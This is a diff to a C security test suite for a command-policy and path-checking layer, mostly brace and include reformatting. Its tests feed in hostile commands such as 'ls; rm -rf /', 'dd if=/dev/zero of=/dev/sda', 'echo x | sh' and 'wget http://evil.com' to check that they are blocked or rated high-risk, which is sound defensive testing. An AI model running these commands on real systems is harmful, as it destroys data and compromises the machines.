@@ -1,20 +1,20 @@
 /* Security edge cases (~40 tests). No real I/O where possible. */
-#include "test_framework.h"
-#include "seaclaw/security.h"
-#include "seaclaw/security/audit.h"
-#include <stdio.h>
-#include "seaclaw/tools/path_security.h"
 #include "seaclaw/core/allocator.h"
 #include "seaclaw/core/error.h"
-#include <string.h>
+#include "seaclaw/security.h"
+#include "seaclaw/security/audit.h"
+#include "seaclaw/tools/path_security.h"
+#include "test_framework.h"
+#include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
 #include <unistd.h>
 
 /* ─── Policy / path ──────────────────────────────────────────────────────── */
 static void test_policy_wildcard_allows_all(void) {
     sc_security_policy_t p = {
         .autonomy = SC_AUTONOMY_FULL,
-        .allowed_commands = (const char *[]){ "*" },
+        .allowed_commands = (const char *[]){"*"},
         .allowed_commands_len = 1,
     };
     SC_ASSERT_TRUE(sc_policy_is_command_allowed(&p, "ls"));
@@ -22,7 +22,7 @@ static void test_policy_wildcard_allows_all(void) {
 }
 
 static void test_policy_explicit_allowlist_blocks_other(void) {
-    const char *allowed[] = { "git" };
+    const char *allowed[] = {"git"};
     sc_security_policy_t p = {
         .autonomy = SC_AUTONOMY_SUPERVISED,
         .allowed_commands = allowed,
@@ -46,7 +46,7 @@ static void test_policy_path_traversal_encoded(void) {
 static void test_policy_command_substitution_blocked(void) {
     sc_security_policy_t p = {
         .autonomy = SC_AUTONOMY_SUPERVISED,
-        .allowed_commands = (const char *[]){ "echo" },
+        .allowed_commands = (const char *[]){"echo"},
         .allowed_commands_len = 1,
     };
     SC_ASSERT_FALSE(sc_policy_is_command_allowed(&p, "echo `whoami`"));
@@ -55,7 +55,7 @@ static void test_policy_command_substitution_blocked(void) {
 static void test_policy_redirect_blocked(void) {
     sc_security_policy_t p = {
         .autonomy = SC_AUTONOMY_SUPERVISED,
-        .allowed_commands = (const char *[]){ "echo" },
+        .allowed_commands = (const char *[]){"echo"},
         .allowed_commands_len = 1,
     };
     SC_ASSERT_FALSE(sc_policy_is_command_allowed(&p, "echo x > /etc/passwd"));
@@ -64,7 +64,7 @@ static void test_policy_redirect_blocked(void) {
 static void test_policy_command_with_semicolons(void) {
     sc_security_policy_t p = {
         .autonomy = SC_AUTONOMY_SUPERVISED,
-        .allowed_commands = (const char *[]){ "ls" },
+        .allowed_commands = (const char *[]){"ls"},
         .allowed_commands_len = 1,
     };
     SC_ASSERT_FALSE(sc_policy_is_command_allowed(&p, "ls; rm -rf /"));
@@ -145,7 +145,8 @@ static void test_secret_encrypt_long_string(void) {
     sc_secret_store_t *store = sc_secret_store_create(&sys, dir, 1);
     SC_ASSERT_NOT_NULL(store);
     char longstr[2000];
-    for (size_t i = 0; i < sizeof(longstr) - 1; i++) longstr[i] = 'x';
+    for (size_t i = 0; i < sizeof(longstr) - 1; i++)
+        longstr[i] = 'x';
     longstr[sizeof(longstr) - 1] = '\0';
     char *enc = NULL;
     sc_error_t err = sc_secret_store_encrypt(store, &sys, longstr, &enc);
@@ -228,8 +229,8 @@ static void test_path_resolved_allowed_empty_list(void) {
 
 static void test_path_resolved_allowed_workspace_prefix(void) {
     sc_allocator_t alloc = sc_system_allocator();
-    SC_ASSERT_TRUE(sc_path_resolved_allowed(&alloc,
-        "/home/user/proj/sub/file.txt", "/home/user/proj", NULL, 0));
+    SC_ASSERT_TRUE(sc_path_resolved_allowed(&alloc, "/home/user/proj/sub/file.txt",
+                                            "/home/user/proj", NULL, 0));
 }
 
 static void test_path_is_safe_relative_ok(void) {
@@ -260,7 +261,7 @@ static void test_policy_record_action(void) {
     sc_rate_tracker_t *tr = sc_rate_tracker_create(&sys, 2);
     sc_security_policy_t p = {
         .autonomy = SC_AUTONOMY_SUPERVISED,
-        .allowed_commands = (const char *[]){ "ls" },
+        .allowed_commands = (const char *[]){"ls"},
         .allowed_commands_len = 1,
         .tracker = tr,
     };
@@ -373,24 +374,24 @@ static void test_audit_old_events_without_new_fields_still_work(void) {
 }
 
 static void test_policy_can_act_full(void) {
-    sc_security_policy_t p = { .autonomy = SC_AUTONOMY_FULL };
+    sc_security_policy_t p = {.autonomy = SC_AUTONOMY_FULL};
     SC_ASSERT_TRUE(sc_policy_can_act(&p));
 }
 
 static void test_policy_can_act_readonly(void) {
-    sc_security_policy_t p = { .autonomy = SC_AUTONOMY_READ_ONLY };
+    sc_security_policy_t p = {.autonomy = SC_AUTONOMY_READ_ONLY};
     SC_ASSERT_FALSE(sc_policy_can_act(&p));
 }
 
 static void test_security_shell_allowed(void) {
-    sc_security_policy_t p = { .allow_shell = true };
+    sc_security_policy_t p = {.allow_shell = true};
     SC_ASSERT_TRUE(sc_security_shell_allowed(&p));
     p.allow_shell = false;
     SC_ASSERT_FALSE(sc_security_shell_allowed(&p));
 }
 
 static void test_security_path_allowed_with_allowlist(void) {
-    const char *allowed[] = { "/tmp/ws" };
+    const char *allowed[] = {"/tmp/ws"};
     sc_security_policy_t p = {
         .allowed_paths = allowed,
         .allowed_paths_count = 1,
@@ -405,7 +406,8 @@ static void test_path_is_safe_null(void) {
 
 static void test_path_is_safe_long(void) {
     char buf[5000];
-    for (size_t i = 0; i < 4095; i++) buf[i] = 'a';
+    for (size_t i = 0; i < 4095; i++)
+        buf[i] = 'a';
     buf[4095] = '\0';
     SC_ASSERT_TRUE(sc_path_is_safe(buf));
 }
@@ -419,31 +421,31 @@ static void test_hex_encode_empty(void) {
 
 /* ─── Policy risk level & command validation ─────────────────────────────── */
 static void test_policy_command_risk_rm_high(void) {
-    sc_security_policy_t p = { .autonomy = SC_AUTONOMY_FULL };
+    sc_security_policy_t p = {.autonomy = SC_AUTONOMY_FULL};
     sc_command_risk_level_t r = sc_policy_command_risk_level(&p, "rm -rf /");
     SC_ASSERT(r == SC_RISK_HIGH);
 }
 
 static void test_policy_command_risk_ls_low(void) {
-    sc_security_policy_t p = { .autonomy = SC_AUTONOMY_FULL };
+    sc_security_policy_t p = {.autonomy = SC_AUTONOMY_FULL};
     sc_command_risk_level_t r = sc_policy_command_risk_level(&p, "ls -la");
     SC_ASSERT(r == SC_RISK_LOW);
 }
 
 static void test_policy_command_risk_git_commit_medium(void) {
-    sc_security_policy_t p = { .autonomy = SC_AUTONOMY_FULL };
+    sc_security_policy_t p = {.autonomy = SC_AUTONOMY_FULL};
     sc_command_risk_level_t r = sc_policy_command_risk_level(&p, "git commit -m x");
     SC_ASSERT(r == SC_RISK_MEDIUM);
 }
 
 static void test_policy_command_risk_sudo_high(void) {
-    sc_security_policy_t p = { .autonomy = SC_AUTONOMY_FULL };
+    sc_security_policy_t p = {.autonomy = SC_AUTONOMY_FULL};
     sc_command_risk_level_t r = sc_policy_command_risk_level(&p, "sudo apt install x");
     SC_ASSERT(r == SC_RISK_HIGH);
 }
 
 static void test_policy_validate_command_low_ok(void) {
-    sc_security_policy_t p = { .autonomy = SC_AUTONOMY_SUPERVISED };
+    sc_security_policy_t p = {.autonomy = SC_AUTONOMY_SUPERVISED};
     sc_command_risk_level_t risk;
     sc_error_t err = sc_policy_validate_command(&p, "ls", false, &risk);
     SC_ASSERT_EQ(err, SC_OK);
@@ -461,7 +463,7 @@ static void test_policy_validate_command_high_blocked(void) {
 }
 
 static void test_policy_validate_command_high_approved_ok(void) {
-    const char *allowed[] = { "rm" };
+    const char *allowed[] = {"rm"};
     sc_security_policy_t p = {
         .autonomy = SC_AUTONOMY_SUPERVISED,
         .block_high_risk_commands = false,
@@ -476,7 +478,7 @@ static void test_policy_validate_command_high_approved_ok(void) {
 }
 
 static void test_policy_can_act_supervised(void) {
-    sc_security_policy_t p = { .autonomy = SC_AUTONOMY_SUPERVISED };
+    sc_security_policy_t p = {.autonomy = SC_AUTONOMY_SUPERVISED};
     SC_ASSERT_TRUE(sc_policy_can_act(&p));
 }
 
@@ -506,7 +508,8 @@ static void test_pairing_valid_code_succeeds(void) {
     sc_pair_attempt_result_t r = sc_pairing_guard_attempt_pair(g, code, &tok);
     SC_ASSERT(r == SC_PAIR_PAIRED);
     SC_ASSERT_NOT_NULL(tok);
-    if (tok) sys.free(sys.ctx, tok, strlen(tok) + 1);
+    if (tok)
+        sys.free(sys.ctx, tok, strlen(tok) + 1);
     sc_pairing_guard_destroy(g);
 }
 
@@ -545,14 +548,13 @@ static void test_audit_event_type_command(void) {
 
 static void test_path_resolved_allowed_denied_outside(void) {
     sc_allocator_t alloc = sc_system_allocator();
-    SC_ASSERT_FALSE(sc_path_resolved_allowed(&alloc,
-        "/etc/passwd", "/home/user/ws", NULL, 0));
+    SC_ASSERT_FALSE(sc_path_resolved_allowed(&alloc, "/etc/passwd", "/home/user/ws", NULL, 0));
 }
 
 static void test_path_resolved_allowed_subpath(void) {
     sc_allocator_t alloc = sc_system_allocator();
-    SC_ASSERT_TRUE(sc_path_resolved_allowed(&alloc,
-        "/home/user/ws/sub/file", "/home/user/ws", NULL, 0));
+    SC_ASSERT_TRUE(
+        sc_path_resolved_allowed(&alloc, "/home/user/ws/sub/file", "/home/user/ws", NULL, 0));
 }
 
 static void test_hex_encode_decode_full(void) {
@@ -569,7 +571,7 @@ static void test_hex_encode_decode_full(void) {
 
 /* ─── WP-21B parity: policy bypass, autonomy, file ops ─────────────────────── */
 static void test_policy_readonly_blocks_even_allowlist(void) {
-    const char *allowed[] = { "ls", "cat" };
+    const char *allowed[] = {"ls", "cat"};
     sc_security_policy_t p = {
         .autonomy = SC_AUTONOMY_READ_ONLY,
         .allowed_commands = allowed,
@@ -580,7 +582,7 @@ static void test_policy_readonly_blocks_even_allowlist(void) {
 }
 
 static void test_policy_file_ops_path_denied(void) {
-    const char *allowed[] = { "/tmp/ws" };
+    const char *allowed[] = {"/tmp/ws"};
     sc_security_policy_t p = {
         .allowed_paths = allowed,
         .allowed_paths_count = 1,
@@ -589,7 +591,7 @@ static void test_policy_file_ops_path_denied(void) {
 }
 
 static void test_policy_file_ops_path_allowed_subpath(void) {
-    const char *allowed[] = { "/tmp/ws" };
+    const char *allowed[] = {"/tmp/ws"};
     sc_security_policy_t p = {
         .allowed_paths = allowed,
         .allowed_paths_count = 1,
@@ -600,20 +602,20 @@ static void test_policy_file_ops_path_allowed_subpath(void) {
 static void test_policy_bypass_pipe_blocked(void) {
     sc_security_policy_t p = {
         .autonomy = SC_AUTONOMY_SUPERVISED,
-        .allowed_commands = (const char *[]){ "echo" },
+        .allowed_commands = (const char *[]){"echo"},
         .allowed_commands_len = 1,
     };
     SC_ASSERT_FALSE(sc_policy_is_command_allowed(&p, "echo x | sh"));
 }
 
 static void test_policy_risk_curl_medium_or_high(void) {
-    sc_security_policy_t p = { .autonomy = SC_AUTONOMY_FULL };
+    sc_security_policy_t p = {.autonomy = SC_AUTONOMY_FULL};
     sc_command_risk_level_t r = sc_policy_command_risk_level(&p, "curl https://example.com");
     SC_ASSERT(r >= SC_RISK_LOW && r <= SC_RISK_HIGH);
 }
 
 static void test_policy_risk_wget_medium(void) {
-    sc_security_policy_t p = { .autonomy = SC_AUTONOMY_FULL };
+    sc_security_policy_t p = {.autonomy = SC_AUTONOMY_FULL};
     sc_command_risk_level_t r = sc_policy_command_risk_level(&p, "wget http://evil.com");
     SC_ASSERT(r == SC_RISK_MEDIUM || r == SC_RISK_HIGH);
 }
@@ -643,14 +645,14 @@ static void test_pairing_wrong_code_fails(void) {
 }
 
 static void test_policy_autonomy_read_only(void) {
-    sc_security_policy_t p = { .autonomy = SC_AUTONOMY_READ_ONLY };
+    sc_security_policy_t p = {.autonomy = SC_AUTONOMY_READ_ONLY};
     SC_ASSERT_FALSE(sc_policy_can_act(&p));
 }
 
 static void test_policy_autonomy_supervised(void) {
     sc_security_policy_t p = {
         .autonomy = SC_AUTONOMY_SUPERVISED,
-        .allowed_commands = (const char *[]){ "ls", "cat" },
+        .allowed_commands = (const char *[]){"ls", "cat"},
         .allowed_commands_len = 2,
     };
     SC_ASSERT_TRUE(sc_policy_can_act(&p));
@@ -658,30 +660,30 @@ static void test_policy_autonomy_supervised(void) {
 }
 
 static void test_policy_autonomy_full(void) {
-    sc_security_policy_t p = { .autonomy = SC_AUTONOMY_FULL };
+    sc_security_policy_t p = {.autonomy = SC_AUTONOMY_FULL};
     SC_ASSERT_TRUE(sc_policy_can_act(&p));
 }
 
 static void test_policy_command_risk_chmod(void) {
-    sc_security_policy_t p = { .autonomy = SC_AUTONOMY_FULL };
+    sc_security_policy_t p = {.autonomy = SC_AUTONOMY_FULL};
     sc_command_risk_level_t r = sc_policy_command_risk_level(&p, "chmod 777 /etc/passwd");
     SC_ASSERT(r >= SC_RISK_MEDIUM);
 }
 
 static void test_policy_command_risk_dd(void) {
-    sc_security_policy_t p = { .autonomy = SC_AUTONOMY_FULL };
+    sc_security_policy_t p = {.autonomy = SC_AUTONOMY_FULL};
     sc_command_risk_level_t r = sc_policy_command_risk_level(&p, "dd if=/dev/zero of=/dev/sda");
     SC_ASSERT(r == SC_RISK_HIGH);
 }
 
 static void test_policy_command_risk_npm_install(void) {
-    sc_security_policy_t p = { .autonomy = SC_AUTONOMY_FULL };
+    sc_security_policy_t p = {.autonomy = SC_AUTONOMY_FULL};
     sc_command_risk_level_t r = sc_policy_command_risk_level(&p, "npm install -g pkg");
     SC_ASSERT(r >= SC_RISK_LOW);
 }
 
 static void test_policy_command_risk_pip_install(void) {
-    sc_security_policy_t p = { .autonomy = SC_AUTONOMY_FULL };
+    sc_security_policy_t p = {.autonomy = SC_AUTONOMY_FULL};
     sc_command_risk_level_t r = sc_policy_command_risk_level(&p, "pip install package");
     SC_ASSERT(r >= SC_RISK_LOW);
 }
@@ -741,7 +743,7 @@ static void test_path_traversal_mixed(void) {
 }
 
 static void test_security_path_allowed_empty_allowlist_denies(void) {
-    sc_security_policy_t p = { .allowed_paths = NULL, .allowed_paths_count = 0 };
+    sc_security_policy_t p = {.allowed_paths = NULL, .allowed_paths_count = 0};
     /* Default-deny: empty allowlist means no path is allowed */
     SC_ASSERT_FALSE(sc_security_path_allowed(&p, "/any/path", 9));
 }
